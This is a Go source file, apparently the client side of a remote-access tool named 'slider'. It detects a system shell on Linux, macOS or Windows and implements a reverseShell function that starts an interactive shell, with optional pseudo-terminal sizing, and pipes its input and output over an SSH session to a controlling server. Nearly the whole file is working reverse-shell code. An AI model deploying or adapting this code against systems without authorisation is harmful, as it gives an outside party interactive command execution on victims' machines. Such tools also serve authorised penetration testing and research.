package client

import (
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"runtime"
	"slider/pkg/sconn"

	"github.com/creack/pty"
	"golang.org/x/crypto/ssh"
)

type Interpreter struct {
	shell     string
	shellArgs []string
	cmdArgs   []string
	pty       string
	size      sconn.TermSize
	ptyF      *os.File
}

var nixShells = []string{
	"/bin/bash",
	"/bin/sh",
	"/bin/zsh",
	"/bin/csh",
	"/bin/ksh",
	"/bin/tsh",
}

func findNixShell() string {
	// TODO: May want to check if the user has execution rights
	for _, sh := range nixShells {
		if _, err := os.Stat(sh); !os.IsNotExist(err) {
			return sh
		}
	}
	return ""
}

func (c *client) setInterpreter() error {
	if c.interpreter.shell != "" {
		return nil
	}

	system := runtime.GOOS

	switch system {
	case "darwin":
		// Use explicitly "bash" cause exists and "zsh" adds an extra "\n%" after return
		c.interpreter.shell = "/bin/bash"
		c.interpreter.pty = "pty"
		// Make it interactive. Among other things will show prompt
		c.interpreter.shellArgs = []string{"-i"}
		c.interpreter.cmdArgs = []string{"-c"}

	case "windows":
		// TODO: Logic to decide running "cmd" or "powershell" (default to "cmd") inside a "Command" or a "ConPTY"
		// https://pkg.go.dev/github.com/UserExistsError/conpty#section-readme
		// https://devblogs.microsoft.com/commandline/windows-command-line-introducing-the-windows-pseudo-console-conpty/
		// TODO: Default path but might not be this one
		var winCmd = "Windows\\system32\\cmd.exe"
		systemDrive := os.Getenv("SYSTEMDRIVE")
		if systemDrive == "" {
			// Try default if not automatically detected
			systemDrive = "C:"
		}
		c.interpreter.shell = fmt.Sprintf("%s\\%s", systemDrive, winCmd)
		c.interpreter.cmdArgs = []string{"/c"}

	default:
		// Handle any *Nix like OS
		if shellEnv := os.Getenv("SHELL"); shellEnv != "" {
			c.interpreter.shell = shellEnv
		} else {
			c.interpreter.shell = findNixShell()
		}
		c.interpreter.shellArgs = []string{"-i"}
		c.interpreter.cmdArgs = []string{"-c"}

	}

	if c.interpreter.shell == "" {
		return fmt.Errorf("can not find a suitable shell on system %s", system)
	}

	return nil
}

func (c *client) reverseShell(sshSession *ssh.Session, initReq *ssh.Request) error {
	err := c.setInterpreter()
	if err != nil {
		return err
	}

	stdin, stdinErr := sshSession.StdinPipe()
	if stdinErr != nil {
		fmt.Printf("session.StdinPipe: %s", stdinErr)
	}
	defer func() {
		_ = stdin.Close()
	}()
	stdout, stdoutErr := sshSession.StdoutPipe()
	if stdoutErr != nil {
		fmt.Printf("session.StdoutPipe: %s", stdoutErr)
	}

	cmd := exec.Command(c.interpreter.shell, c.interpreter.shellArgs...) //nolint:gosec

	switch c.interpreter.pty {
	// TODO: Add ConPty implementation (Windows > 2018)
	case "conPty":
	case "pty":
		errSSHReq := c.sendSessionRequest(sshSession, "request-pty", true, nil)
		if errSSHReq != nil {
			return fmt.Errorf("request-pty %s", errSSHReq)
		}
		errSSHReq = c.sendSessionRequest(sshSession, "reverse-shell", true, nil)
		if errSSHReq != nil {
			return fmt.Errorf("reverse-shell %s", errSSHReq)
		}
		_, payload, reqErr := c.sendConnRequest("window-size", true, nil)
		if reqErr != nil {
			return reqErr
		}
		var termSize sconn.TermSize
		if unMarshalErr := json.Unmarshal(payload, &termSize); unMarshalErr != nil {
			c.Fatalf("%s", unMarshalErr)
		}
		rows := termSize.Rows
		cols := termSize.Cols
		c.interpreter.ptyF, _ = pty.StartWithSize(cmd, &pty.Winsize{
			Rows: uint16(rows),
			Cols: uint16(cols),
		})

		// Copy all SSH session output to the pty
		go func() {
			if _, outCopyErr := io.Copy(c.interpreter.ptyF, stdout); outCopyErr != nil {
				c.Debugf("Copy stdout: %s", outCopyErr)
			}
		}()

		// Answer Server we are good to go

		_ = c.replyConnRequest(initReq, true, []byte("shell-ready"))

		// Copy pty output to SSH session stdin
		if _, inCopyErr := io.Copy(stdin, c.interpreter.ptyF); inCopyErr != nil {
			c.Debugf("Copy stdin: %s", inCopyErr)
		}
	default:
		// Pipe requirement on Windows
		rp, wp := io.Pipe()
		go func() {
			_, _ = io.Copy(wp, stdout)
			c.Debugf("out finish")
		}()

		cmd.Stdout = stdin
		cmd.Stdin = rp
		cmd.Stderr = stdin

		environment := []string{
			fmt.Sprintf("LINES=%d", c.interpreter.size.Rows),
			fmt.Sprintf("COLUMNS=%d", c.interpreter.size.Cols),
		}
		for _, envVar := range environment {
			cmd.Env = append(cmd.Environ(), envVar)
		}

		// Answer Server we are good to go
		_ = c.replyConnRequest(initReq, true, []byte("shell-ready"))

		if err = cmd.Run(); err != nil {
			return err
		}
	}

	return nil
}
